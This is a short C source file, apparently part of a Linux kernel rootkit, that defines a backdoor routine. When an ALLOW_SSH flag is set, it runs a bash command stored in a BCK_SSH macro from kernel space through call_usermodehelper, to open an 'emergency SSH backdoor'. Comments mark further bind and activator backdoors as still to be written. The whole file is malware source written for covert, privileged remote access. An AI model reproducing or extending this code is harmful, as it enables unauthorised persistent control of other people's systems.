#include "backdoor.h"

static void backdoor_ssh(void) {

    char *argv[] = { "/bin/bash", "-c", BCK_SSH, NULL };
    char *envp[] = { "HOME=/", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

void backdoor(void) {

    /* EMERGENCY SSH BACKDOOR */
    if (ALLOW_SSH == 1) {
        backdoor_ssh();
    }

    /* TODO BIND BACKDOOR */

    /* TODO ACTIVATOR BACKDOOR */
}